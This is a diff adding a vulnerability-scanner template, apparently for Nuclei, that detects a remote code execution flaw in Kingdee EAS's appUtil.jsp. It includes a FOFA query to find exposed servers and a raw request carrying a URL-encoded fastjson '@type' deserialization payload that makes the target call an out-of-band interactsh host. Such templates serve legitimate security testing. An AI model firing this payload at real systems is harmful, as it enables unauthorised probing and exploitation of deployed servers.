@@ -1,0 +1,22 @@
+id: kingdee-eas-apputil-rce
+
+info:
+  name: kingdee-eas-apputil-rce
+  author: unknow
+  severity: high
+  metadata:
+    fofa-query: body="easSessionId" || header="easportal"
+  tags: kingdee
+
+http:
+  - raw:
+      - |+
+        GET /easportal/tools/appUtil.jsp?list=%7B%22x%22%3A%7B%22%40type%22%3A%22java.net.Inet4Address%22%2C%22val%22%3A%22{{interactsh-url}}%22%7D%7D HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
